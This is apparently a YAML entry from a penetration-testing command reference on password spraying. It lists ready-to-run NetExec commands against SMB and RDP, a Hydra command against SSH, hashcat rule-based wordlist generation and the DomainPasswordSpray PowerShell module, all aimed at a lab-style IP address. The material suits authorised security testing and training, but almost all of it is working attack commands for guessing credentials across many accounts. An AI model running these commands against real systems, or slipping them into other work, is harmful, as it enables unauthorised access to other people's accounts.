---
description: |
  Password spraying — test one or a few passwords against many accounts across multiple protocols. Includes rule-based password generation.
commands:
  - have: Password
    cmd: |
      # Spray one password against user list via SMB
      nxc smb 10.10.10.27 -u users.txt -p 'P@ssw0rd' --continue-on-success

      # Spray via RDP
      nxc rdp 10.10.10.27 -u users.txt -p 'P@ssw0rd'

      # Hydra — spray SSH
      hydra -L users.txt -P pass.txt ssh://10.10.10.27 -t 4
  - have: Username
    cmd: |
      # Hashcat rule-based password generation (dive.rule)
      hashcat raw.txt --stdout -r /usr/share/hashcat/rules/dive.rule > rawpass.txt

      # Hashcat rule-based generation (best64.rule — faster)
      hashcat raw.txt --stdout -r /usr/share/hashcat/rules/best64.rule > rawpass.txt

      # Spray generated passwords against a known user
      nxc smb 10.10.10.27 -u sec_user -p rawpass.txt --continue-on-success

      # PowerShell — DomainPasswordSpray (from Windows domain-joined host)
      Import-Module .\DomainPasswordSpray.ps1
      Invoke-DomainPasswordSpray -Password 'P@ssw0rd'
phase:
  - Exploitation
target_os:
  - Windows
services:
  - SMB
  - LDAP
  - Kerberos
  - SSH
  - RDP
techniques:
  - Password_Spraying
references:
  - https://www.netexec.wiki/
  - https://github.com/dafthack/DomainPasswordSpray
  - https://github.com/vanhauser-thc/thc-hydra
---
